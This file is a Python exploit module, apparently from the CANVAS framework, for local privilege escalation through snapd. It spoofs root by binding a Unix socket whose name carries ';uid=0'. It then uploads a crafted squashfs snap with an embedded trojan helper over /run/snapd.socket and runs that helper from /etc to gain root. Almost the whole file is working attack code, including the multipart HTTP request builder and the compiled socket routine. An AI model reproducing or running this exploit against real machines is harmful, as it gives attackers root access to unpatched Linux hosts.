#!/usr/bin/env python

from __future__ import with_statement
import os
import re
import sys
import time
import logging

from exploitutils import randomstring
from libs import yaml
from libs.canvasos import canvasos
from libs.node_utils import update_graph_node
from ExploitTypes.linuxLocalExploit import LinuxLocalExploit

if '.' not in sys.path:
    sys.path.append('.')

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']
PAYLOAD       = metadata['PAYLOAD']


class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name                = NAME
        self.node                = None
        self.client_sockname     = '/tmp/%s;uid=0' % randomstring(8)
        self.server_sockname     = '/run/snapd.socket'
        self.snapname            = randomstring(8).lower()
        self.helpername          = randomstring(8)
        self.snapdata            = PAYLOAD['snapdata']         # squash filesystem
        self.offset              = int(PAYLOAD['offset'])      # offset to encode binary in squash filesystem
        self.sizedecode          = int(PAYLOAD['sizedecode'])  # size of decode binary
        self.remote_helper       = ''
        self.remote_exp          = self.client_sockname

    def get_local_helper(self):
        if self.is_32bit_node():
            with open(self.local_helper_32, 'rb') as f:
                data = f.read()
            return data, 'i386 '
        elif self.is_64bit_node():
            with open(self.local_helper_64, 'rb') as f:
                data = f.read()
            return data, 'amd64'

        raise Exception("Can't determinate node architecture")

    def create_post_request(self):
        # we need to create a file of the same size as the file
        # in the squash filesystem to avoid break the format
        helperencode, arch = self.get_local_helper()
        helperencode = helperencode.ljust(self.sizedecode, '\x00').encode('base64')
        helperencode = helperencode.replace('\n', '')

        # create an unique snap to avoid being ignored
        squashfs = self.snapdata.replace('snapname', self.snapname)
        squashfs = squashfs.replace('trojname', self.helpername)  # random trojan filename
        squashfs = squashfs.replace('ARCHX', arch)

        # replace original file in squash filesystem for our helper
        squashfs = squashfs[:self.offset] + helperencode + squashfs[self.offset + len(helperencode):]

        boundary = randomstring(8).encode('hex')
        fname    = randomstring(8)

        post_data  = '\n--------------------------BOUNDARY\n'
        post_data += 'Content-Disposition: form-data; name="devmode"\n\n'
        post_data += 'true\n'
        post_data += '--------------------------BOUNDARY\n'
        post_data += 'Content-Disposition: form-data; name="snap"; filename="FNAME.snap"\n\n'
        post_data += squashfs + '\n'
        post_data += '--------------------------BOUNDARY--'

        post_data = post_data.replace('BOUNDARY', boundary)
        post_data = post_data.replace('FNAME', fname.lower())


        http_post  = 'POST /v2/snaps HTTP/1.1\r\n'
        http_post += 'Host: 127.0.0.1\r\n'
        http_post += 'Content-Type: multipart/form-data; boundary=------------------------%s\r\n' % boundary
        http_post += 'Expect: 100-continue\r\n'
        http_post += 'Content-Length: %d\r\n\r\n' % len(post_data)

        return http_post, post_data

    def trigger_exploit(self):

        code = """
        #import "int", "FD" as "FD"
        #import "string", "cli_sockname" as "cli_sockname"
        #import "string", "srv_sockname" as "srv_sockname"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "bind" as "bind"
        #import "local", "connect" as "connect"
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "strcpy" as "strcpy"
        #import "local", "readblock" as "readblock"
        #import "local", "writeblock" as "writeblock"
        #import "local", "sendstring" as "sendstring"
        #import "local", "malloc" as "malloc"
        #import "local", "write" as "write"
        #import "local", "read" as "read"

        struct sockaddr_un {
            unsigned short sun_family;
            char        sun_path[108];
        };

        void main()
        {
            struct sockaddr_un cli_addr;
            struct sockaddr_un srv_addr;
            int res;
            int sock;
            int sizedata;
            char *ptrHeader;
            char *ptrBody;
            char data[1024];

            memset(cli_addr.sun_path, 0, 108);
            memset(srv_addr.sun_path, 0, 108);

            cli_addr.sun_family = 1; // AF_UNIX
            srv_addr.sun_family = 1; // AF_UNIX
            strcpy(cli_addr.sun_path, cli_sockname);
            strcpy(srv_addr.sun_path, srv_sockname);


            sock = socket(1, 1, 0); // socket(AF_UNIX, SOCK_STREAM, 0);
            if (sock != -1) {
                sendint(sock);
                res = bind(sock, &cli_addr, 110);
                if (res != -1)
                {
                    sendint(1);
                    res = connect(sock, &srv_addr, 110);
                    if (res != -1)
                    {
                        sendint(1);

                        //send headers to unix socket
                        readblock(FD, &sizedata, 4);       // read post len
                        ptrHeader = malloc(sizedata + 1);  // alloc post memory
                        readblock(FD, ptrHeader, sizedata);   // read post data
                        writeblock(sock, ptrHeader, sizedata);  // send post data to unix socket

                        read(sock, data, 1024);     // read HTTP response
                        sendstring(data);

                        // send post data to unix socket
                        readblock(FD, &sizedata, 4);       // read post len
                        ptrBody = malloc(sizedata + 1);  // alloc post memory
                        readblock(FD, ptrBody, sizedata);   // read post data
                        writeblock(sock, ptrBody, sizedata);  // send post data to unix socket


                        read(sock, data, 1024);      // read HTTP response
                        sendstring(data);

                        close(sock);
                        return;
                    }
                    sendint(0);
                }
                sendint(0);
            }
            sendint(0);
        }
        """

        vars = {
            'FD'           : self.node.shell.fd,
            'cli_sockname' : self.client_sockname,
            'srv_sockname' : self.server_sockname
        }

        headers, body = self.create_post_request()

        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(req)
        self.setProgress(20)
        ret = self.node.shell.readint()
        if ret == 0:
            logging.info("Failed to create Unix Domain Socket")
            self.node.shell.leave()
            self.add_file_for_cleanup(self.remote_exp)
            return 0

        logging.info("Unix Domain socket created: %d" % ret)

        ret = self.node.shell.readint()
        if ret == 0:
            logging.info("Failed bind to %s" % self.client_sockname)
            self.node.shell.leave()
            self.add_file_for_cleanup(self.remote_exp)
            return 0

        logging.info("Bind Unix Domain socket (%s)" % self.client_sockname)

        ret = self.node.shell.readint()
        if ret == 0:
            logging.info("Failed connect to %s" % self.server_sockname)
            self.node.shell.leave()
            self.add_file_for_cleanup(self.remote_exp)
            return 0

        logging.info("Connected to Unix Domain socket (%s)" % self.server_sockname)
        self.setProgress(40)
        logging.info("Sending HTTP POST headers")
        self.node.shell.writeint(len(headers))
        self.node.shell.writebuf(headers)

        if '100 Continue' not in self.node.shell.readstring():
            logging.info("Incorrect HTTP response, maybe target is not vulnerable")
            self.node.shell.leave()
            self.add_file_for_cleanup(self.remote_exp)
            return 0

        logging.info("Sending HTTP POST body")
        self.node.shell.writeint(len(body))
        self.node.shell.writebuf(body)

        if '"status-code":202' not in self.node.shell.readstring():
            logging.info("Incorrect HTTP response, maybe target is not vulnerable")
            self.node.shell.leave()
            self.add_file_for_cleanup(self.remote_exp)
            return 0

        self.node.shell.leave()

        self.remote_helper = '/etc/%s' % self.helpername

        logging.info("Checking remote helper: %s" % self.remote_helper)
        self.setProgress(80)
        wait_secs = 40
        if self.compromised(self.remote_helper, wait_secs):
            logging.info('Compromised!')
            logging.info('Upgrading MOSDEF connection loop')
            self.fork_and_exec(self.remote_helper, wait = 1)
            logging.info('Upgrade connection done!')
            self.init_mosdef_upgrade()
            if hasattr(self.node.shell, 'popen2') and self.node.shell.popen2:
                whoami = self.node.shell.popen2('whoami').strip()
            update_graph_node(self.node, self.engine, whoami=whoami)
            logging.info('LPE successful!')
            self.add_file_for_cleanup(self.remote_helper)
            self.add_file_for_cleanup(self.remote_exp)
            return 1
        else:
            self.log('Looks like we failed, try again!')
            self.add_file_for_cleanup(self.remote_helper)
            self.add_file_for_cleanup(self.remote_exp)
            return 0


    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))
            if self.trigger_exploit():
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                ret += 1
            else:
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

        return ret


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
